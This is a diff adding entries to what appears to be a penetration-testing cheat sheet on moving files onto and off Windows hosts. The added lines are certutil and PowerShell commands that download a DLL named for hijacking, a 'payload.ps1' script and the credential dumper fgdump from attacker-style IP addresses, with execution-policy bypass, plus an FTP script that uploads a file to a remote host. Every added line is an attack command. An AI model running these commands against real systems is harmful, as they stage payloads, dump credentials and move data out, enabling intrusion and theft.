@@ -10,11 +10,34 @@
 
 #### HTTP
 
+certutil
 ```
 certutil -urlcache -split -f "http://10.9.228.20/hijackme.dll" C:\temp\hijackme.dll
 ```
+powershell
+```powershell
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')
+```
+
+```powershell
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >> wget.ps1
+echo $url = "http://10.11.0.90/fgdump.exe" >> wget.ps1
+echo $file = "exploit.exe" >> wget.ps1
+echo $webclient.DownloadFile($url,$file) >> wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+```
+
 
 #### FTP
+
+```
+echo open '[ip address]' 21> ftp.txt
+echo user username password >> ftp.txt
+echo put '[file to upload]'>> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
+```
 
 #### SMB
 
